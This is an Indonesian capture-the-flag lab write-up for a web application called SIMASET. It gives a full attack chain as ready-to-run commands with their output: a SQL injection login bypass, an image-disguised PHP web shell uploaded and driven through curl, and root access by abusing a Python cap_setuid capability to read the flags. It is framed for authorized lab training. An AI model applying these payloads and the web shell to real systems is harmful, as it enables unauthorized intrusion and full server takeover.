# 07 Write-Up Lab SIMASET
## SQL Injection Authentication Bypass → Unrestricted File Upload → PHP Web Shell → RCE `www-data` → Linux Capability `cap_setuid` → Root → Flags

> **Khusus untuk ujian, laboratorium, CTF, atau pengujian keamanan yang telah memperoleh izin.**
>
> Dokumen ini disusun dari evidence pada capture `SIMASET.pdf` dan mengikuti pola penulisan `02_sipadu.md`:
> - **Bagian A** membahas attack path secara detail dan berurutan.
> - **Bagian B** merangkum analisis kerentanan, dampak, evidence, dan rekomendasi.
> - **Bagian C** menyediakan close-book cheat sheet setelah konsep dipahami.
>
> Seluruh alamat IP, payload, flag, dan command di dalam dokumen ini hanya ditujukan untuk environment LAB.

---

## Cara Menggunakan Dokumen

1. Pelajari **Bagian A** untuk memahami hubungan antara SQL injection, bypass autentikasi, upload file berbahaya, RCE, Linux capabilities, dan privilege escalation.
2. Gunakan **Bagian B** sebagai bahan penyusunan laporan hasil pengujian keamanan.
3. Gunakan **Bagian C** sebagai panduan cepat ketika praktik atau ujian.
4. Jalankan command hanya terhadap target LAB yang telah disediakan.
5. Jangan menganggap root di dalam container otomatis sama dengan root pada host. Selalu verifikasi scope kompromi.

---

## Ringkasan Data Hafalan

```text
NETWORK                  = 192.168.56.0/24
TARGET                   = 192.168.56.14
WEB                      = http://192.168.56.14
PORT                     = 80/tcp

APPLICATION              = SIMASET — Manajemen Aset
APPLICATION_VERSION      = SIMASET v3.0
WEB_SERVER               = Apache httpd 2.4.67 (Debian)
RUNTIME                  = PHP 8.2.31

ADMIN_PATH               = /admin/index.php
UPLOAD_DIRECTORY         = /uploads/
DATABASE_FILE_HINT       = /db.php

SQLI_PAYLOAD             = ' OR '1'='1'-- -
SQLI_RESULT              = authentication bypass sebagai admin

WEBSHELL_FILE            = shell.php
WEBSHELL_PREFIX          = GIF89a;
WEBSHELL_CODE            = <?php system($_GET['cmd']); ?>
WEBSHELL_URL             = http://192.168.56.14/uploads/shell.php

INITIAL_ACCESS           = www-data
INITIAL_UID              = 33
INITIAL_GID              = 33
HOSTNAME_CAPTURE         = e84f45876e9c
INITIAL_PWD              = /var/www/html/uploads

SUDO                     = tidak tersedia
SUID_RESULT              = binary standar; tidak menjadi jalur utama
CAPABILITY_BINARY        = /usr/bin/python3.13
CAPABILITY               = cap_setuid=ep
PRIVESC_TECHNIQUE        = os.setuid(0)
ROOT_UID                 = 0
ROOT_GID_AFTER_PRIVESC   = 33

USER_FLAG_PATH           = /home/pengelola/flag.txt
USER_FLAG                = FLAG{sql_un10n_upl04d_7c4e9a13}

ROOT_FLAG_PATH           = /root/flag.txt
ROOT_FLAG                = FLAG{r00t_aset_pr1v3sc_3e8b6f20}
```

---

## Attack Path Singkat

```text
Host discovery 192.168.56.0/24
→ target 192.168.56.14 ditemukan
→ Nmap menemukan Apache pada port 80
→ HTTP title menunjukkan SIMASET
→ Nikto menemukan /admin/index.php dan /db.php
→ halaman login admin dibuka
→ payload ' OR '1'='1'-- - digunakan pada username
→ autentikasi berhasil dilewati
→ panel admin memiliki fungsi upload foto aset
→ shell.php dibuat dengan prefix GIF89a;
→ file PHP berhasil diunggah ke /uploads/
→ shell.php dipanggil dengan parameter cmd
→ RCE diperoleh sebagai www-data
→ enumerasi SUID tidak memberikan jalur langsung
→ sudo tidak tersedia
→ getcap menemukan /usr/bin/python3.13 cap_setuid=ep
→ Python memanggil os.setuid(0)
→ command berjalan sebagai root
→ find menemukan /home/pengelola/flag.txt dan /root/flag.txt
→ user flag dan root flag dibaca
```

---

# Bagian A — Pembahasan Detail

> Target pembaca: peserta yang ingin memahami alur dari reconnaissance sampai memperoleh user flag dan root flag, sekaligus memahami evidence pada setiap tahap.

---

## 1. Gambaran Besar

Lab SIMASET memperlihatkan exploit chain yang menggabungkan tiga kelemahan utama:

1. Halaman login pengelola rentan terhadap **SQL Injection Authentication Bypass**.
2. Panel admin menerima upload file PHP yang dapat dieksekusi oleh web server.
3. Binary `/usr/bin/python3.13` memiliki Linux capability `cap_setuid=ep`, sehingga proses `www-data` dapat mengubah UID menjadi `0`.

Alur eksploitasi tidak berhenti pada keberhasilan login. Bypass autentikasi hanya memberikan akses ke panel pengelola. Akses tersebut kemudian digunakan untuk mengunggah web shell. Web shell memberikan command execution sebagai `www-data`. Setelah itu, enumerasi privilege lokal menemukan capability berbahaya pada Python yang memungkinkan privilege escalation menjadi root.

```text
SQL Injection
→ Admin Panel
→ Upload PHP
→ Web Shell
→ RCE www-data
→ Enumerasi lokal
→ Python cap_setuid
→ UID 0
→ Flag
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Jaringan LAB | `192.168.56.0/24` |
| Target SIMASET | `192.168.56.14` |
| Port terbuka | `80/tcp` |
| Web server | `Apache httpd 2.4.67 (Debian)` |
| Runtime | `PHP 8.2.31` |
| Aplikasi | `SIMASET — Manajemen Aset` |
| Versi aplikasi | `SIMASET v3.0` |
| Halaman admin | `/admin/index.php` |
| Direktori upload | `/uploads/` |
| Jenis initial access | PHP web shell |
| Account proses web | `www-data`, UID 33 |
| Binary privilege escalation | `/usr/bin/python3.13` |
| Capability | `cap_setuid=ep` |
| User lokal | `pengelola` |
| User flag | `/home/pengelola/flag.txt` |
| Root flag | `/root/flag.txt` |

---

## 3. Pemetaan Evidence Capture

### Capture halaman 1

Halaman pertama menunjukkan:

```text
nmap -sn 192.168.56.0/24
nmap -sC -sV 192.168.56.14
nikto -h http://192.168.56.14
```

Evidence penting:

```text
192.168.56.14 aktif
80/tcp open http
Apache httpd 2.4.67 (Debian)
http-title: Beranda | SIMASET
/admin/index.php terdeteksi
/db.php terdeteksi
```

Capture juga memperlihatkan halaman **Login Pengelola Aset** dan payload:

```text
' OR '1'='1'-- -
```

### Capture halaman 2

Halaman kedua menunjukkan:

```text
pembuatan shell.php
upload shell.php berhasil
file tersimpan di /uploads/
shell.php?cmd=id menghasilkan UID 33 www-data
enumerasi command melalui curl
enumerasi SUID
```

### Capture halaman 3

Halaman ketiga menunjukkan:

```text
sudo tidak tersedia
getcap menemukan /usr/bin/python3.13 cap_setuid=ep
os.setuid(0) menghasilkan UID 0
find menemukan dua flag
user flag dan root flag dibaca
```

---

## 4. Fase 1 — Host Discovery

### Tujuan

Menemukan host aktif pada jaringan Host-Only sebelum melakukan service enumeration.

### Command

```bash
nmap -sn 192.168.56.0/24
```

### Output Evidence

Capture menunjukkan beberapa host aktif, termasuk:

```text
192.168.56.12
192.168.56.13
192.168.56.14
192.168.56.100
192.168.56.124
```

Target SIMASET adalah:

```text
192.168.56.14
```

### Makna Output

Opsi `-sn` melakukan host discovery tanpa port scan penuh. Tahap ini digunakan untuk mengidentifikasi kandidat target pada subnet LAB.

### Variabel Kerja

```bash
NETWORK="192.168.56.0/24"
TARGET="192.168.56.14"
WEB="http://192.168.56.14"
```

---

## 5. Fase 2 — Service Enumeration

### Command dari Capture

```bash
nmap -sC -sV 192.168.56.14
```

### Output Evidence

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.67 ((Debian))
|_http-title: Beranda | SIMASET
|_http-server-header: Apache/2.4.67 (Debian)
```

### Makna Output

Hasil tersebut mengonfirmasi bahwa:

```text
Target     = 192.168.56.14
Port       = 80/tcp
Service    = HTTP
Web server = Apache 2.4.67 pada Debian
Aplikasi   = SIMASET
```

### Pemeriksaan Tambahan yang Disarankan

```bash
curl -i "$WEB"
```

```bash
nmap -p80 --script http-title,http-headers,http-methods "$TARGET"
```

Untuk memastikan tidak ada port TCP lain yang terlewat:

```bash
nmap -sC -sV -p- "$TARGET"
```

> Capture hanya membuktikan port `80/tcp`. Full-port scan merupakan langkah pelengkap agar enumerasi lebih lengkap.

---

## 6. Fase 3 — Web Enumeration dengan Nikto

### Command

```bash
nikto -h http://192.168.56.14
```

### Evidence Utama

Capture memperlihatkan informasi berikut:

```text
Server: Apache/2.4.67 (Debian)
X-Powered-By: PHP/8.2.31
```

Nikto juga melaporkan beberapa security header tidak tersedia:

```text
Content-Security-Policy
Permissions-Policy
Strict-Transport-Security
X-Content-Type-Options
Referrer-Policy
```

Temuan lain:

```text
PHPSESSID dibuat tanpa flag HttpOnly
/admin/index.php terlihat menarik
/db.php terlihat menarik
```

### Makna Temuan `/admin/index.php`

Path tersebut menjadi kandidat halaman administratif:

```text
http://192.168.56.14/admin/index.php
```

### Makna Temuan `/db.php`

File tersebut berpotensi berkaitan dengan koneksi atau konfigurasi database:

```text
http://192.168.56.14/db.php
```

Namun, capture tidak menunjukkan bahwa isi `db.php` dapat dibaca langsung. Karena itu, dokumen ini hanya mencatatnya sebagai **indikator hasil enumerasi**, bukan sebagai bukti kebocoran source code.

### Catatan tentang Security Header

Ketiadaan security header penting untuk hardening, tetapi bukan jalur utama eksploitasi pada capture ini. Attack path utama adalah:

```text
SQL injection
→ upload bypass
→ RCE
→ capability abuse
```

---

## 7. Fase 4 — Mengenali Aplikasi dan Halaman Login

### URL

```text
http://192.168.56.14/admin/index.php
```

### Informasi Visual dari Capture

Halaman menampilkan:

```text
SIMASET — Manajemen Aset
Bagian Pengelolaan Barang Milik Daerah
Login Pengelola Aset
SIMASET v3.0
```

Form login memiliki dua field:

```text
Username
Kata Sandi
```

### Tujuan Pengujian

Memeriksa apakah input login:

- menggunakan query database dengan parameter aman;
- dapat dimanipulasi menggunakan karakter SQL;
- memberikan perbedaan respons antara input valid dan tidak valid.

### Baseline

Sebelum melakukan pengujian SQL injection, gunakan credential acak untuk mengamati respons gagal:

```text
Username : test
Password : test
```

Catat:

- pesan error;
- perubahan URL;
- status HTTP;
- cookie sesi;
- ukuran respons;
- waktu respons.

---

## 8. Fase 5 — SQL Injection Authentication Bypass

### Payload dari Capture

Masukkan pada field **Username**:

```text
' OR '1'='1'-- -
```

Field password dapat diisi nilai acak/nonkosong karena capture tidak memperlihatkan nilai password yang digunakan.

Contoh:

```text
Username : ' OR '1'='1'-- -
Password : test
```

### Mengapa Payload Bekerja

Secara konseptual, aplikasi rentan dapat membangun query seperti:

```sql
SELECT *
FROM users
WHERE username = '<INPUT_USERNAME>'
  AND password = '<INPUT_PASSWORD>';
```

Setelah input dimanipulasi:

```sql
SELECT *
FROM users
WHERE username = '' OR '1'='1'-- -'
  AND password = 'test';
```

Bagian:

```sql
'1'='1'
```

selalu bernilai benar.

Bagian:

```sql
-- -
```

mengomentari sisa query sehingga pemeriksaan password tidak lagi memengaruhi hasil.

> Struktur query di atas bersifat ilustratif. Source code backend tidak tersedia pada capture, sehingga nama tabel dan kolom sebenarnya tidak boleh diasumsikan.

### Evidence Keberhasilan

Setelah form dikirim, pengguna diarahkan ke:

```text
Panel Pengelola — admin
```

Hal ini membuktikan bahwa payload berhasil melewati proses autentikasi.

### Kesimpulan

Jenis kerentanan:

```text
SQL Injection pada proses autentikasi
```

Dampak langsung:

```text
Authentication bypass
→ akses administratif tanpa credential valid
```

---

## 9. Fase 6 — Validasi Session Admin

Setelah masuk ke panel, pastikan akses administratif benar-benar aktif.

### Evidence Visual

Capture menunjukkan:

```text
Panel Pengelola — admin
Unggah foto dokumentasi aset
Foto Aset Tersimpan
```

### Pemeriksaan yang Disarankan

Gunakan browser DevTools atau Burp Suite untuk mencatat:

```text
Request login
Response login
Set-Cookie
Redirect
Request halaman admin
```

Periksa cookie:

```text
PHPSESSID
```

Nikto mengindikasikan bahwa cookie tersebut tidak menggunakan flag `HttpOnly`.

### Jangan Menebak Nama Parameter

Capture tidak memperlihatkan nama parameter POST login. Karena itu, contoh otomatisasi harus menggunakan placeholder:

```bash
curl -i -s -X POST "$WEB/admin/index.php" \
  --data-urlencode "<PARAM_USERNAME>=' OR '1'='1'-- -" \
  --data-urlencode "<PARAM_PASSWORD>=test"
```

Ganti:

```text
<PARAM_USERNAME>
<PARAM_PASSWORD>
```

berdasarkan request aktual yang terlihat di Burp Suite atau browser DevTools.

---

## 10. Fase 7 — Analisis Fitur Upload

### Informasi Panel

Panel menyatakan:

```text
Unggah foto dokumentasi aset
format gambar: JPG, PNG
Berkas tersimpan di direktori /uploads/
```

### Risiko Keamanan

Fitur upload aman seharusnya memverifikasi:

```text
extension
MIME type
magic bytes
isi file
nama file hasil penyimpanan
lokasi penyimpanan
permission
kemampuan eksekusi
```

Capture memperlihatkan bahwa file bernama:

```text
shell.php
```

berhasil diunggah dan kemudian dieksekusi oleh Apache/PHP.

Artinya terdapat kombinasi kelemahan:

```text
validasi file tidak memadai
+
direktori upload dapat diakses publik
+
file PHP dapat dieksekusi
```

---

## 11. Fase 8 — Membuat PHP Web Shell

### Command dari Capture

Di mesin attacker:

```bash
cat > shell.php <<'EOF'
GIF89a;
<?php system($_GET['cmd']); ?>
EOF
```

### Isi File

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### Penjelasan Prefix `GIF89a;`

`GIF89a` merupakan signature yang umum ditemukan pada file GIF. Dalam LAB ini, prefix tersebut digunakan untuk melewati validasi file yang hanya memeriksa bagian awal file atau signature gambar secara lemah.

Karena file tetap menggunakan extension:

```text
.php
```

Apache/PHP mengeksekusi kode di dalamnya saat URL file dipanggil.

### Fungsi Web Shell

Parameter:

```text
cmd
```

dibaca melalui:

```php
$_GET['cmd']
```

Kemudian command dikirim ke:

```php
system()
```

Contoh:

```text
shell.php?cmd=id
```

### Verifikasi Lokal

```bash
cat shell.php
```

Expected:

```text
GIF89a;
<?php system($_GET['cmd']); ?>
```

### Catatan

Prefix `GIF89a;` akan ikut tampil dalam respons web shell. Hal tersebut normal pada capture.

---

## 12. Fase 9 — Mengunggah Web Shell

### Langkah melalui Browser

1. Buka panel admin.
2. Pada bagian **Foto Aset**, pilih `shell.php`.
3. Klik **Unggah Foto**.
4. Pastikan aplikasi menampilkan pesan sukses.

### Evidence Capture

```text
Foto aset "shell.php" berhasil diunggah.
```

Daftar file tersimpan menunjukkan:

```text
mini_b374k.jpg.php
mini_b374k.php
shell.php
```

### Lokasi File

Panel menyatakan file disimpan di:

```text
/uploads/
```

Maka URL shell menjadi:

```text
http://192.168.56.14/uploads/shell.php
```

### Validasi HTTP

```bash
curl -i "$WEB/uploads/shell.php"
```

Tanpa parameter `cmd`, respons hanya menampilkan prefix:

```text
GIF89a;
```

---

## 13. Fase 10 — Validasi Remote Command Execution

### Melalui Browser

Buka:

```text
http://192.168.56.14/uploads/shell.php?cmd=id
```

### Output Evidence

```text
GIF89a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Kesimpulan

Web shell telah memberikan:

```text
Remote Command Execution
```

dengan konteks:

```text
User  = www-data
UID   = 33
Group = www-data
GID   = 33
```

---

## 14. Fase 11 — Menggunakan Web Shell melalui Curl

### Set Variabel

```bash
SHELL_URL="http://192.168.56.14/uploads/shell.php"
```

> Hindari memakai nama variabel shell bawaan `SHELL` pada script produksi. Pada capture nama `SHELL` digunakan, tetapi `SHELL_URL` lebih jelas.

### Validasi Dasar

```bash
curl -sG \
  --data-urlencode 'cmd=id; whoami; hostname; pwd' \
  "$SHELL_URL"
```

### Output Evidence

```text
GIF89a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
e84f45876e9c
/var/www/html/uploads
```

### Makna Output

```text
Initial user = www-data
Hostname     = e84f45876e9c
Working dir  = /var/www/html/uploads
```

Hostname berbentuk string heksadesimal pendek sehingga terdapat indikasi bahwa aplikasi berjalan di dalam container. Hal tersebut perlu diverifikasi dan tidak boleh langsung dianggap sebagai root pada host.

### Uji Command Terpisah

```bash
curl -sG --data-urlencode 'cmd=whoami' "$SHELL_URL"
```

```bash
curl -sG --data-urlencode 'cmd=hostname' "$SHELL_URL"
```

```bash
curl -sG --data-urlencode 'cmd=pwd' "$SHELL_URL"
```

---

## 15. Fase 12 — Enumerasi Awal sebagai `www-data`

### Informasi Sistem

```bash
curl -sG \
  --data-urlencode 'cmd=uname -a; cat /etc/os-release; id' \
  "$SHELL_URL"
```

### Enumerasi User

```bash
curl -sG \
  --data-urlencode 'cmd=cat /etc/passwd' \
  "$SHELL_URL"
```

Cari user dengan home directory dan shell login:

```bash
curl -sG \
  --data-urlencode 'cmd=grep -E "/home/|/bin/bash|/bin/sh" /etc/passwd' \
  "$SHELL_URL"
```

### Enumerasi Home Directory

```bash
curl -sG \
  --data-urlencode 'cmd=find /home -maxdepth 3 -type f -ls 2>/dev/null' \
  "$SHELL_URL"
```

### Enumerasi Konfigurasi Aplikasi

```bash
curl -sG \
  --data-urlencode 'cmd=find /var/www/html -maxdepth 3 -type f -iname "*.php" -ls 2>/dev/null' \
  "$SHELL_URL"
```

Cari file konfigurasi:

```bash
curl -sG \
  --data-urlencode 'cmd=find /var/www/html -maxdepth 4 -type f \( -iname "*.env" -o -iname "*config*" -o -iname "db.php" \) -ls 2>/dev/null' \
  "$SHELL_URL"
```

> Capture tidak menunjukkan pembacaan credential database. Jangan menambahkan credential yang tidak terlihat pada evidence.

---

## 16. Fase 13 — Enumerasi SUID

### Command dari Capture

```bash
curl -sG \
  --data-urlencode 'cmd=find / -perm -4000 -type f 2>/dev/null' \
  "$SHELL_URL"
```

### Output Evidence

```text
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
```

### Makna Output

Daftar tersebut berisi binary SUID yang umum pada Linux. Tidak ada binary nonstandar yang langsung menjadi jalur privilege escalation pada capture.

### Cek Permission Detail

```bash
curl -sG \
  --data-urlencode 'cmd=ls -la /usr/bin/mount /usr/bin/passwd /usr/bin/newgrp /usr/bin/chfn /usr/bin/su /usr/bin/gpasswd /usr/bin/umount /usr/bin/chsh' \
  "$SHELL_URL"
```

### Output Evidence Ringkas

```text
-rwsr-xr-x root root /usr/bin/chfn
-rwsr-xr-x root root /usr/bin/chsh
-rwsr-xr-x root root /usr/bin/gpasswd
-rwsr-xr-x root root /usr/bin/mount
-rwsr-xr-x root root /usr/bin/newgrp
-rwsr-xr-x root root /usr/bin/passwd
-rwsr-xr-x root root /usr/bin/su
-rwsr-xr-x root root /usr/bin/umount
```

### Kesimpulan

SUID harus tetap dicatat sebagai evidence enumerasi, tetapi attack path utama bukan melalui daftar tersebut.

---

## 17. Fase 14 — Pemeriksaan Sudo

### Command dari Capture

```bash
curl -sG \
  --data-urlencode 'cmd=sudo -l 2>&1' \
  "$SHELL_URL"
```

### Output Evidence

```text
sh: 1: sudo: not found
```

### Makna Output

Package atau binary `sudo` tidak tersedia dalam environment tersebut.

Karena itu, jalur berikut tidak dapat digunakan:

```text
sudo -l
sudo <binary>
```

### Langkah Berikutnya

Lanjutkan enumerasi:

```text
Linux capabilities
cron
writable files
environment variables
container configuration
```

Pada capture, jalur yang berhasil adalah **Linux capabilities**.

---

## 18. Fase 15 — Enumerasi Linux Capabilities

### Command dari Capture

```bash
curl -sG \
  --data-urlencode 'cmd=getcap -r / 2>/dev/null' \
  "$SHELL_URL"
```

### Output Evidence

```text
/usr/bin/python3.13 cap_setuid=ep
```

### Makna Capability

Capability:

```text
cap_setuid
```

memberikan kemampuan untuk mengubah UID proses.

Flag:

```text
e = effective
p = permitted
```

Dengan konfigurasi:

```text
cap_setuid=ep
```

Python dapat memanggil fungsi seperti:

```python
os.setuid(0)
```

tanpa perlu binary SUID atau `sudo`.

### Mengapa Ini Berbahaya

Python merupakan interpreter serbaguna. Jika interpreter tersebut memiliki `cap_setuid`, setiap user yang dapat menjalankannya berpotensi mengubah UID menjadi root.

Attack path:

```text
www-data
→ menjalankan /usr/bin/python3.13
→ os.setuid(0)
→ UID 0
```

### Validasi Binary

```bash
curl -sG \
  --data-urlencode 'cmd=ls -l /usr/bin/python3.13; getcap /usr/bin/python3.13' \
  "$SHELL_URL"
```

Expected:

```text
/usr/bin/python3.13 cap_setuid=ep
```

---

## 19. Fase 16 — Privilege Escalation dengan Python

### Command dari Capture

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("id; whoami")'\''' \
  "$SHELL_URL"
```

### Bentuk Command Python

```python
import os
os.setuid(0)
os.system("id; whoami")
```

### Output Evidence

```text
GIF89a;
uid=0(root) gid=33(www-data) groups=33(www-data)
root
```

### Analisis Output

Output memperlihatkan:

```text
UID  = 0(root)
GID  = 33(www-data)
User = root
```

Privilege escalation berhasil pada UID. Group masih `www-data`, tetapi UID `0` sudah memberikan privilege root untuk operasi filesystem dan proses yang diperiksa pada LAB.

### Validasi Tambahan

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); print(os.getuid(), os.geteuid(), os.getgid())'\''' \
  "$SHELL_URL"
```

Expected:

```text
0 0 33
```

### Mendapatkan Shell Root Lokal pada Proses

Untuk menjalankan shell sebagai UID 0:

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("/bin/sh -c \"id; whoami\"")'\''' \
  "$SHELL_URL"
```

Pada web shell sederhana, setiap request bersifat command execution satu kali. Untuk stabilitas ujian, jalankan command root langsung melalui Python daripada memaksakan TTY interaktif.

---

## 20. Fase 17 — Mencari Flag

### Command dari Capture

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("find / -type f -name \"flag.txt\" 2>/dev/null")'\''' \
  "$SHELL_URL"
```

### Output Evidence

```text
/home/pengelola/flag.txt
/root/flag.txt
```

### Makna Output

Ditemukan dua flag:

```text
User flag = /home/pengelola/flag.txt
Root flag = /root/flag.txt
```

### Catatan Evidence

Capture menemukan dan membaca user flag setelah privilege escalation. Karena itu, dokumen ini tidak mengklaim bahwa `/home/pengelola/flag.txt` dapat dibaca langsung oleh `www-data` sebelum menjadi root.

Untuk menguji permission sebelum root:

```bash
curl -sG \
  --data-urlencode 'cmd=ls -l /home/pengelola/flag.txt; cat /home/pengelola/flag.txt 2>&1' \
  "$SHELL_URL"
```

---

## 21. Fase 18 — Membaca User Flag

### Command dari Capture

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); print(open("/home/pengelola/flag.txt").read())'\''' \
  "$SHELL_URL"
```

### Output Evidence

```text
GIF89a;
FLAG{sql_un10n_upl04d_7c4e9a13}
```

### User Flag

```text
FLAG{sql_un10n_upl04d_7c4e9a13}
```

### Makna Flag

Nama flag merepresentasikan kombinasi jalur awal:

```text
SQL injection
+
upload file
```

---

## 22. Fase 19 — Membaca Root Flag

### Command dari Capture

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); print(open("/root/flag.txt").read())'\''' \
  "$SHELL_URL"
```

### Output Evidence

```text
GIF89a;
FLAG{r00t_aset_pr1v3sc_3e8b6f20}
```

### Root Flag

```text
FLAG{r00t_aset_pr1v3sc_3e8b6f20}
```

### Kesimpulan Akhir

Rantai eksploitasi lengkap berhasil:

```text
SQL injection authentication bypass
→ admin panel
→ unrestricted PHP upload
→ web shell
→ RCE sebagai www-data
→ cap_setuid pada Python
→ UID 0
→ user flag
→ root flag
```

---

## 23. Memahami Scope Root

Hostname dari capture:

```text
e84f45876e9c
```

Format tersebut menyerupai container ID. Ini merupakan indikator, bukan bukti tunggal.

### Verifikasi Container

Jalankan sebagai root:

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("test -f /.dockerenv && echo DOCKER; cat /proc/1/cgroup; hostname; ps -p 1 -f")'\''' \
  "$SHELL_URL"
```

### Periksa Mount dan Capability

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("mount | head -n 30; command -v capsh >/dev/null && capsh --print")'\''' \
  "$SHELL_URL"
```

### Periksa Docker Socket

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("ls -l /var/run/docker.sock 2>/dev/null")'\''' \
  "$SHELL_URL"
```

### Interpretasi

Tanpa evidence tambahan, laporan sebaiknya menyatakan:

```text
root pada environment aplikasi/container
```

Bukan otomatis:

```text
root pada host Docker
root pada hypervisor
root pada Windows
```

---

## 24. Validasi Akhir

Checklist keberhasilan:

```text
[ ] Target 192.168.56.14 aktif
[ ] Port 80/tcp terbuka
[ ] Apache 2.4.67 Debian teridentifikasi
[ ] Aplikasi SIMASET ditemukan
[ ] /admin/index.php ditemukan
[ ] Payload SQL injection melewati login
[ ] Panel Pengelola admin dapat diakses
[ ] shell.php berhasil diunggah
[ ] shell.php dapat dieksekusi dari /uploads/
[ ] id menunjukkan UID 33 www-data
[ ] sudo tidak tersedia
[ ] enumerasi SUID telah dilakukan
[ ] getcap menemukan /usr/bin/python3.13 cap_setuid=ep
[ ] os.setuid(0) menghasilkan UID 0
[ ] /home/pengelola/flag.txt ditemukan
[ ] /root/flag.txt ditemukan
[ ] user flag terbaca
[ ] root flag terbaca
[ ] scope container/host telah diverifikasi
```

---

## 25. Troubleshooting

### 25.1 Target Tidak Terlihat pada `nmap -sn`

Periksa interface:

```bash
ip -br addr
ip route
```

Uji konektivitas:

```bash
ping -c 3 192.168.56.14
```

Gunakan scan tanpa host discovery:

```bash
nmap -Pn -sC -sV -p80 192.168.56.14
```

---

### 25.2 `/admin/index.php` Tidak Ditemukan

Cek hasil Nikto:

```bash
nikto -h http://192.168.56.14
```

Uji langsung:

```bash
curl -i http://192.168.56.14/admin/index.php
```

Enumerasi content:

```bash
ffuf -u http://192.168.56.14/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.txt,.html
```

---

### 25.3 SQL Injection Tidak Berhasil

Pastikan payload exact:

```text
' OR '1'='1'-- -
```

Periksa:

```text
ada spasi setelah komentar
payload dimasukkan pada username
password diisi nilai nonkosong
request benar-benar dikirim
session/cookie lama dibersihkan
```

Uji variasi pada LAB:

```text
' OR 1=1-- -
' OR 'a'='a'-- -
admin'-- -
```

Gunakan Burp Suite untuk melihat request aktual dan respons server.

---

### 25.4 Login Berhasil tetapi Panel Kembali ke Login

Periksa cookie:

```text
PHPSESSID
```

Pastikan browser menerima cookie dan mengirimkannya pada request berikutnya.

Dengan curl:

```bash
curl -c cookies.txt -b cookies.txt ...
```

Nama parameter harus diambil dari request aktual.

---

### 25.5 `shell.php` Ditolak

Periksa:

```text
nama file
extension
MIME type
magic bytes
pesan error aplikasi
```

Isi capture:

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

Pastikan file tidak tersimpan sebagai:

```text
shell.php.txt
```

Cek:

```bash
file shell.php
xxd -l 32 shell.php
```

---

### 25.6 Upload Berhasil tetapi URL 404

Panel menyatakan lokasi:

```text
/uploads/
```

Uji:

```bash
curl -i http://192.168.56.14/uploads/shell.php
```

Periksa nama file aktual pada daftar **Foto Aset Tersimpan**.

---

### 25.7 PHP Terunduh dan Tidak Dieksekusi

Hal tersebut berarti handler PHP tidak aktif pada direktori upload atau file disajikan sebagai static content.

Periksa header:

```bash
curl -I http://192.168.56.14/uploads/shell.php
```

Pada capture, PHP dieksekusi dan output `id` tampil.

---

### 25.8 Respons Selalu Diawali `GIF89a;`

Hal tersebut normal karena prefix berada di luar tag PHP:

```php
GIF89a;
<?php ... ?>
```

Gunakan filter:

```bash
curl -sG --data-urlencode 'cmd=id' "$SHELL_URL" | sed 's/^GIF89a;//'
```

---

### 25.9 `sudo` Tidak Ditemukan

Capture memang menghasilkan:

```text
sh: 1: sudo: not found
```

Jangan berhenti. Lanjutkan:

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
find /etc/cron* -type f -maxdepth 2 -ls 2>/dev/null
```

---

### 25.10 `getcap` Tidak Ditemukan

Cari binary:

```bash
command -v getcap
find / -type f -name getcap 2>/dev/null
```

Package terkait biasanya menyediakan `getcap`, tetapi jangan mengubah target LAB tanpa instruksi.

Alternatif enumerasi:

```bash
getfattr -d -m security.capability /usr/bin/python3.13 2>/dev/null
```

---

### 25.11 Python Tidak Menghasilkan UID 0

Validasi capability:

```bash
getcap /usr/bin/python3.13
```

Expected:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Pastikan menggunakan path exact:

```text
/usr/bin/python3.13
```

Gunakan:

```bash
/usr/bin/python3.13 -c 'import os; print(os.getuid()); os.setuid(0); print(os.getuid())'
```

Apabila muncul:

```text
PermissionError
```

capability tidak aktif, binary berbeda, filesystem menggunakan pembatasan tertentu, atau environment tidak sama dengan capture.

---

### 25.12 Quoting Curl Rusak

Gunakan double quote untuk outer command dan escape inner quote dengan hati-hati, atau gunakan variabel payload.

Contoh:

```bash
ROOT_ID='/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("id; whoami")'\'''

curl -sG \
  --data-urlencode "cmd=$ROOT_ID" \
  "$SHELL_URL"
```

---

### 25.13 Flag Tidak Ditemukan

Cari beberapa pola:

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("find / -type f \( -iname \"flag.txt\" -o -iname \"*flag*\" \) 2>/dev/null")'\''' \
  "$SHELL_URL"
```

Periksa root:

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("id; ls -la /root")'\''' \
  "$SHELL_URL"
```

---

## 26. Alur Hafalan SIMASET

```text
nmap -sn 192.168.56.0/24
→ target 192.168.56.14
→ nmap -sC -sV 192.168.56.14
→ Apache port 80
→ nikto -h http://192.168.56.14
→ /admin/index.php
→ ' OR '1'='1'-- -
→ Panel Pengelola admin
→ buat shell.php dengan GIF89a;
→ upload ke /uploads/
→ shell.php?cmd=id
→ www-data
→ find SUID
→ sudo tidak ada
→ getcap -r /
→ /usr/bin/python3.13 cap_setuid=ep
